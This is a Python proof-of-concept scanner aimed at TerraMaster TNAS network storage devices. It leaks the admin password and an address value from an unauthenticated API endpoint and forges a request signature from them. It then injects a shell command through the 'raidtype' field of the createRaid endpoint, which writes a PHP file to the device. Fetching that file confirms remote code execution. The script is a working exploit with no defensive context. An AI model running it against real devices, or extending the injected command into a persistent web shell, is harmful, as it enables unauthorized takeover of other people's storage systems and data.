import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def substr(strs,s,lens):
	result=strs[s:s+lens]
	return result
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f1=str(randomInt(10000, 90000))
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f2=md5(str(randomInt(20000, 50000)).encode()).hexdigest()
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"module/api.php?mobile/webNasIPS"
	headers={'User-Agent': 'TNAS'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "NOTIFY Message" in response.text and "PWD:" in response.text and "SAT:" in response.text:
		r0=True
		try:
			PWD=re.findall("PWD:(.*)\\\\nSAT",response.text)[0]
			ADDR=re.findall("ADDR:(.*)\\\\nPWD",response.text)[0]
			ADDR=substr(ADDR, 6, 6)
			sign=md5(str(ADDR + "2647818745").encode()).hexdigest()
		except:
			PWD=''
			sign=''
	else:
		PWD=''
		sign=''
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"module/api.php?mobile/createRaid"
	body="raidtype=%3Becho+%22%3C%3Fphp+echo+md5("+f1+")%3B%3F%3E%22%3E"+f2+".php&diskstring=XXXX"
	headers={'User-Agent': 'TNAS', 'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': f'{PWD}', 'Timestamp': '2647818745', 'Signature': f'{sign}'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "createRaid successful" in response.text:
		r1=True
	else:
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"module/"+f2+".php"
	headers={'User-Agent': 'TNAS'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
